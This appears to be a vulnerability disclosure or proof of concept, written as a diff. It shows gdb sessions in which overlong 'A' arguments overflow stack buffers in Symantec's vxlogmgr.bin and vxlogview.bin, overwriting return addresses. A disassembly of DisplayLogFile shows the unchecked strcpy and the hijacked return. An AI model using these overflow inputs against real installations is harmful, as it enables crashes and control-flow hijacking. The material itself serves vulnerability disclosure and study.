@@ -1,0 +1,283 @@
+VRTSpbx-1.4.0.10-10.x86_64.rpm
+
+[mc@localhost bin]$ ./vxlogmgr.bin -v
+vxlogmgr version 3.0.10.0
+Symantec Corporation
+Copyright 2007 Symantec Corporation. All rights reserved.
+[mc@localhost bin]$ gdb -q --args ./vxlogmgr.bin -d -o `python -c 'print "A" * 324'`
+Reading symbols from /opt/VRTSpbx/bin/vxlogmgr.bin...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /opt/VRTSpbx/bin/vxlogmgr.bin -d -o AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[Thread debugging using libthread_db enabled]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000003ecd87f76a in strcat () from /lib64/libc.so.6
+Missing separate debuginfos, use: debuginfo-install VRTSpbx-1.4.0.10-10.x86_64
+(gdb) bt
+#0  0x0000003ecd87f76a in strcat () from /lib64/libc.so.6
+#1  0x00000000004033d9 in vrtsLogCreateQueryString ()
+#2  0x4141414141414141 in ?? ()
+#3  0x4141414141414141 in ?? ()
+#4  0x4141414141414141 in ?? ()
+#5  0x4141414141414141 in ?? ()
+#6  0x4141414141414141 in ?? ()
+#7  0x4141414141414141 in ?? ()
+#8  0x4141414141414141 in ?? ()
+#9  0x4141414141414141 in ?? ()
+#10 0x4141414141414141 in ?? ()
+#11 0x4141414141414141 in ?? ()
+#12 0x4141414141414141 in ?? ()
+#13 0x4141414141414141 in ?? ()
+#14 0x4141414141414141 in ?? ()
+#15 0x4141414141414141 in ?? ()
+#16 0x4141414141414141 in ?? ()
+#17 0x4141414141414141 in ?? ()
+#18 0x4141414141414141 in ?? ()
+#19 0x4141414141414141 in ?? ()
+#20 0x4141414141414141 in ?? ()
+#21 0x4141414141414141 in ?? ()
+#22 0x4141414141414141 in ?? ()
+#23 0x4141414141414141 in ?? ()
+#24 0x4141414141414141 in ?? ()
+#25 0x4141414141414141 in ?? ()
+#26 0x2927414141414141 in ?? ()
+#27 0x0000000000000000 in ?? ()
+
+///////////////////////////////
+
+[mc@localhost bin]$ ./vxlogview.bin -v
+vxlogview version 3.0.10.0
+Symantec Corporation
+Copyright 2007 Symantec Corporation. All rights reserved.
+[mc@localhost bin]$ gdb -q --args ./vxlogview.bin -w `python -c 'print "A" * 1524'`
+Reading symbols from /opt/VRTSpbx/bin/vxlogview.bin...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /opt/VRTSpbx/bin/vxlogview.bin -w AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[Thread debugging using libthread_db enabled]
+V-1-1-11 Failed to read the logging system configuration.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000405a22 in DisplayLogFile ()
+Missing separate debuginfos, use: debuginfo-install VRTSpbx-1.4.0.10-10.x86_64
+(gdb) bt
+#0  0x0000000000405a22 in DisplayLogFile ()
+#1  0x4141414141414141 in ?? ()
+#2  0x4141414141414141 in ?? ()
+#3  0x4141414141414141 in ?? ()
+#4  0x4141414141414141 in ?? ()
+#5  0x4141414141414141 in ?? ()
+#6  0x4141414141414141 in ?? ()
+#7  0x4141414141414141 in ?? ()
+#8  0x4141414141414141 in ?? ()
+#9  0x4141414141414141 in ?? ()
+#10 0x4141414141414141 in ?? ()
+#11 0x4141414141414141 in ?? ()
+#12 0x4141414141414141 in ?? ()
+#13 0x4141414141414141 in ?? ()
+#14 0x4141414141414141 in ?? ()
+#15 0x4141414141414141 in ?? ()
+#16 0x4141414141414141 in ?? ()
+#17 0x4141414141414141 in ?? ()
+#18 0x4141414141414141 in ?? ()
+#19 0x4141414141414141 in ?? ()
+#20 0x4141414141414141 in ?? ()
+#21 0x4141414141414141 in ?? ()
+#22 0x4141414141414141 in ?? ()
+#23 0x4141414141414141 in ?? ()
+#24 0x4141414141414141 in ?? ()
+#25 0x4141414141414141 in ?? ()
+#26 0x4141414141414141 in ?? ()
+#27 0x4141414141414141 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#28 0x4141414141414141 in ?? ()
+#29 0x4141414141414141 in ?? ()
+#30 0x4141414141414141 in ?? ()
+#31 0x4141414141414141 in ?? ()
+#32 0x4141414141414141 in ?? ()
+#33 0x4141414141414141 in ?? ()
+#34 0x4141414141414141 in ?? ()
+#35 0x4141414141414141 in ?? ()
+#36 0x4141414141414141 in ?? ()
+#37 0x4141414141414141 in ?? ()
+#38 0x4141414141414141 in ?? ()
+#39 0x4141414141414141 in ?? ()
+#40 0x4141414141414141 in ?? ()
+#41 0x4141414141414141 in ?? ()
+#42 0x4141414141414141 in ?? ()
+#43 0x4141414141414141 in ?? ()
+#44 0x4141414141414141 in ?? ()
+#45 0x4141414141414141 in ?? ()
+#46 0x4141414141414141 in ?? ()
+#47 0x4141414141414141 in ?? ()
+#48 0x4141414141414141 in ?? ()
+#49 0x4141414141414141 in ?? ()
+#50 0x4141414141414141 in ?? ()
+#51 0x4141414141414141 in ?? ()
+#52 0x4141414141414141 in ?? ()
+#53 0x4141414141414141 in ?? ()
+#54 0x4141414141414141 in ?? ()
+#55 0x4141414141414141 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#56 0x00007f0041414141 in ?? ()
+#57 0x00007fffffffeedf in ?? ()
+#58 0x00007fffffffeee8 in ?? ()
+#59 0x00007fffffffeeff in ?? ()
+#60 0x00007fffffffef32 in ?? ()
+#61 0x00007fffffffef40 in ?? ()
+#62 0x00007fffffffef48 in ?? ()
+#63 0x00007fffffffef53 in ?? ()
+#64 0x00007fffffffef85 in ?? ()
+#65 0x00007fffffffefa7 in ?? ()
+#66 0x00007fffffffefc4 in ?? ()
+#67 0x0000000000000000 in ?? ()
+(gdb) disass DisplayLogFile
+Dump of assembler code for function DisplayLogFile:
+   0x0000000000405700 <+0>:	push   %rbp
+   0x0000000000405701 <+1>:	mov    %rsp,%rbp
+   0x0000000000405704 <+4>:	push   %rbx
+   0x0000000000405705 <+5>:	sub    $0x1ef8,%rsp
+   0x000000000040570c <+12>:	movl   $0x0,-0x14(%rbp)
+   0x0000000000405713 <+19>:	movb   $0x0,-0x439(%rbp)
+   0x000000000040571a <+26>:	mov    0x10519f(%rip),%rax        # 0x50a8c0 <gArgList+4800>
+   0x0000000000405721 <+33>:	mov    %rax,-0x438(%rbp)
+   0x0000000000405728 <+40>:	mov    $0x0,%eax
+   0x000000000040572d <+45>:	callq  0x4045c8 <ReadLogViewConfigFile>
+   0x0000000000405732 <+50>:	cmpq   $0x0,0x10514e(%rip)        # 0x50a888 <gArgList+4744>
+   0x000000000040573a <+58>:	je     0x40594c <DisplayLogFile+588>
+   0x0000000000405740 <+64>:	cmpq   $0x0,0x105148(%rip)        # 0x50a890 <gArgList+4752>
+   0x0000000000405748 <+72>:	je     0x40594c <DisplayLogFile+588>
+   0x000000000040574e <+78>:	movq   $0x0,-0x448(%rbp)
+   0x0000000000405759 <+89>:	mov    0x105128(%rip),%rdi        # 0x50a888 <gArgList+4744>
+   0x0000000000405760 <+96>:	mov    $0x40874e,%esi
+   0x0000000000405765 <+101>:	callq  0x402238 <fopen@plt>
+   0x000000000040576a <+106>:	mov    %rax,-0x448(%rbp)
+   0x0000000000405771 <+113>:	cmpq   $0x0,-0x448(%rbp)
+   0x0000000000405779 <+121>:	jne    0x4057b0 <DisplayLogFile+176>
+   0x000000000040577b <+123>:	mov    0x10513e(%rip),%rdi        # 0x50a8c0 <gArgList+4800>
+   0x0000000000405782 <+130>:	mov    $0x0,%r8d
+   0x0000000000405788 <+136>:	mov    $0x408623,%ecx
+   0x000000000040578d <+141>:	mov    $0x20,%edx
+   0x0000000000405792 <+146>:	mov    $0x408750,%esi
+   0x0000000000405797 <+151>:	mov    $0x0,%eax
+---Type <return> to continue, or q <return> to quit---
+   0x000000000040579c <+156>:	callq  0x402348 <PrintMessage>
+   0x00000000004057a1 <+161>:	movl   $0x20,-0xc74(%rbp)
+   0x00000000004057ab <+171>:	jmpq   0x405a13 <DisplayLogFile+787>
+   0x00000000004057b0 <+176>:	mov    -0x448(%rbp),%rdi
+   0x00000000004057b7 <+183>:	mov    $0x0,%edx
+   0x00000000004057bc <+188>:	mov    $0x0,%esi
+   0x00000000004057c1 <+193>:	callq  0x401d78 <fseek@plt>
+   0x00000000004057c6 <+198>:	mov    -0x448(%rbp),%rdi
+   0x00000000004057cd <+205>:	callq  0x401f18 <feof@plt>
+   0x00000000004057d2 <+210>:	test   %eax,%eax
+   0x00000000004057d4 <+212>:	jne    0x40590e <DisplayLogFile+526>
+   0x00000000004057da <+218>:	cmpb   $0x0,-0x439(%rbp)
+   0x00000000004057e1 <+225>:	jne    0x40590e <DisplayLogFile+526>
+   0x00000000004057e7 <+231>:	lea    -0xc50(%rbp),%rdi
+   0x00000000004057ee <+238>:	mov    $0x800,%edx
+   0x00000000004057f3 <+243>:	mov    $0x0,%esi
+   0x00000000004057f8 <+248>:	callq  0x4020e8 <memset@plt>
+   0x00000000004057fd <+253>:	mov    -0x448(%rbp),%rdx
+   0x0000000000405804 <+260>:	lea    -0xc50(%rbp),%rdi
+   0x000000000040580b <+267>:	mov    $0x800,%esi
+   0x0000000000405810 <+272>:	callq  0x401fd8 <fgets@plt>
+   0x0000000000405815 <+277>:	test   %rax,%rax
+   0x0000000000405818 <+280>:	je     0x40590e <DisplayLogFile+526>
+   0x000000000040581e <+286>:	movq   $0x0,-0xc58(%rbp)
+   0x0000000000405829 <+297>:	movq   $0x0,-0xc60(%rbp)
+   0x0000000000405834 <+308>:	movq   $0x0,-0xc68(%rbp)
+   0x000000000040583f <+319>:	lea    -0xc50(%rbp),%rdi
+   0x0000000000405846 <+326>:	callq  0x401f28 <strlen@plt>
+---Type <return> to continue, or q <return> to quit---
+   0x000000000040584b <+331>:	lea    0x1(%rax),%rdi
+   0x000000000040584f <+335>:	callq  0x402028 <vrtsLogMalloc@plt>
+   0x0000000000405854 <+340>:	mov    %rax,-0xc60(%rbp)
+   0x000000000040585b <+347>:	lea    -0xc50(%rbp),%rdx
+   0x0000000000405862 <+354>:	mov    -0xc60(%rbp),%rdi
+   0x0000000000405869 <+361>:	mov    $0x408758,%esi
+   0x000000000040586e <+366>:	mov    $0x0,%eax
+   0x0000000000405873 <+371>:	callq  0x402188 <sprintf@plt>
+   0x0000000000405878 <+376>:	lea    -0xc58(%rbp),%rdx
+   0x000000000040587f <+383>:	mov    -0xc60(%rbp),%rdi
+   0x0000000000405886 <+390>:	mov    0x103cfb(%rip),%rsi        # 0x509588 <DELIMITERS.0>
+   0x000000000040588d <+397>:	callq  0x402088 <strtok_r@plt>
+   0x0000000000405892 <+402>:	mov    %rax,-0xc68(%rbp)
+   0x0000000000405899 <+409>:	cmpq   $0x0,-0xc68(%rbp)
+   0x00000000004058a1 <+417>:	je     0x4057c6 <DisplayLogFile+198>
+   0x00000000004058a7 <+423>:	mov    0x104fe2(%rip),%rsi        # 0x50a890 <gArgList+4752>
+   0x00000000004058ae <+430>:	mov    -0xc68(%rbp),%rdi
+   0x00000000004058b5 <+437>:	callq  0x401fe8 <strcmp@plt>
+   0x00000000004058ba <+442>:	test   %eax,%eax
+   0x00000000004058bc <+444>:	jne    0x4057c6 <DisplayLogFile+198>
+   0x00000000004058c2 <+450>:	lea    -0xc58(%rbp),%rdx
+   0x00000000004058c9 <+457>:	mov    0x103cc0(%rip),%rsi        # 0x509590 <DELIMITER.1>
+   0x00000000004058d0 <+464>:	mov    $0x0,%edi
+   0x00000000004058d5 <+469>:	callq  0x402088 <strtok_r@plt>
+   0x00000000004058da <+474>:	mov    %rax,-0xc70(%rbp)
+   0x00000000004058e1 <+481>:	cmpq   $0x0,-0xc70(%rbp)
+   0x00000000004058e9 <+489>:	je     0x4057c6 <DisplayLogFile+198>
+   0x00000000004058ef <+495>:	mov    -0xc70(%rbp),%rdi
+---Type <return> to continue, or q <return> to quit---
+   0x00000000004058f6 <+502>:	callq  0x402168 <strdup@plt>
+   0x00000000004058fb <+507>:	mov    %rax,0x104f7e(%rip)        # 0x50a880 <gArgList+4736>
+   0x0000000000405902 <+514>:	movb   $0x1,-0x439(%rbp)
+   0x0000000000405909 <+521>:	jmpq   0x4057c6 <DisplayLogFile+198>
+   0x000000000040590e <+526>:	cmpb   $0x0,-0x439(%rbp)
+   0x0000000000405915 <+533>:	jne    0x40594c <DisplayLogFile+588>
+   0x0000000000405917 <+535>:	mov    0x104fa2(%rip),%rdi        # 0x50a8c0 <gArgList+4800>
+   0x000000000040591e <+542>:	mov    $0x0,%r8d
+   0x0000000000405924 <+548>:	mov    $0x408623,%ecx
+   0x0000000000405929 <+553>:	mov    $0x1000a,%edx
+   0x000000000040592e <+558>:	mov    $0x40862e,%esi
+   0x0000000000405933 <+563>:	mov    $0x0,%eax
+   0x0000000000405938 <+568>:	callq  0x402348 <PrintMessage>
+   0x000000000040593d <+573>:	movl   $0x1,-0xc74(%rbp)
+   0x0000000000405947 <+583>:	jmpq   0x405a13 <DisplayLogFile+787>
+   0x000000000040594c <+588>:	cmpq   $0x0,0x104f2c(%rip)        # 0x50a880 <gArgList+4736>
+   0x0000000000405954 <+596>:	jne    0x4059a8 <DisplayLogFile+680>
+   0x0000000000405956 <+598>:	lea    -0x430(%rbp),%rbx
+   0x000000000040595d <+605>:	mov    %rsp,%rdi
+   0x0000000000405960 <+608>:	mov    $0x509600,%esi
+   0x0000000000405965 <+613>:	mov    $0x1280,%edx
+   0x000000000040596a <+618>:	callq  0x401fc8 <memcpy@plt>
+   0x000000000040596f <+623>:	mov    %rbx,%rdi
+   0x0000000000405972 <+626>:	callq  0x404775 <vrtsLogCreateQueryString>
+   0x0000000000405977 <+631>:	mov    %eax,-0x14(%rbp)
+   0x000000000040597a <+634>:	cmpl   $0x0,-0x14(%rbp)
+   0x000000000040597e <+638>:	je     0x4059bb <DisplayLogFile+699>
+   0x0000000000405980 <+640>:	mov    0x104f39(%rip),%rdi        # 0x50a8c0 <gArgList+4800>
+---Type <return> to continue, or q <return> to quit---
+   0x0000000000405987 <+647>:	mov    $0x0,%r8d
+   0x000000000040598d <+653>:	mov    $0x408623,%ecx
+   0x0000000000405992 <+658>:	mov    $0x1000a,%edx
+   0x0000000000405997 <+663>:	mov    $0x40862e,%esi
+   0x000000000040599c <+668>:	mov    $0x0,%eax
+   0x00000000004059a1 <+673>:	callq  0x402348 <PrintMessage>
+   0x00000000004059a6 <+678>:	jmp    0x4059bb <DisplayLogFile+699>
+   0x00000000004059a8 <+680>:	mov    0x104ed1(%rip),%rsi        # 0x50a880 <gArgList+4736>
+   0x00000000004059af <+687>:	lea    -0x430(%rbp),%rdi
+   0x00000000004059b6 <+694>:	callq  0x401f98 <strcpy@plt>
+   0x00000000004059bb <+699>:	cmpl   $0x0,-0x14(%rbp)
+   0x00000000004059bf <+703>:	jne    0x4059dd <DisplayLogFile+733>
+   0x00000000004059c1 <+705>:	mov    0x104c98(%rip),%rdx        # 0x50a660 <gArgList+4192>
+   0x00000000004059c8 <+712>:	mov    0x104c89(%rip),%rsi        # 0x50a658 <gArgList+4184>
+   0x00000000004059cf <+719>:	lea    -0x430(%rbp),%rdi
+   0x00000000004059d6 <+726>:	callq  0x405a23 <DisplayMessages>
+   0x00000000004059db <+731>:	jmp    0x405a0a <DisplayLogFile+778>
+   0x00000000004059dd <+733>:	mov    0x104edc(%rip),%rdi        # 0x50a8c0 <gArgList+4800>
+   0x00000000004059e4 <+740>:	mov    $0x0,%r8d
+   0x00000000004059ea <+746>:	mov    $0x408623,%ecx
+   0x00000000004059ef <+751>:	mov    $0x1000b,%edx
+   0x00000000004059f4 <+756>:	mov    $0x40862e,%esi
+   0x00000000004059f9 <+761>:	mov    $0x0,%eax
+   0x00000000004059fe <+766>:	callq  0x402348 <PrintMessage>
+   0x0000000000405a03 <+771>:	movl   $0x1,-0x14(%rbp)
+   0x0000000000405a0a <+778>:	mov    -0x14(%rbp),%eax
+   0x0000000000405a0d <+781>:	mov    %eax,-0xc74(%rbp)
+   0x0000000000405a13 <+787>:	mov    -0xc74(%rbp),%eax
+---Type <return> to continue, or q <return> to quit---
+   0x0000000000405a19 <+793>:	add    $0x1ef8,%rsp
+   0x0000000000405a20 <+800>:	pop    %rbx
+   0x0000000000405a21 <+801>:	leaveq 
+=> 0x0000000000405a22 <+802>:	retq   
+End of assembler dump.
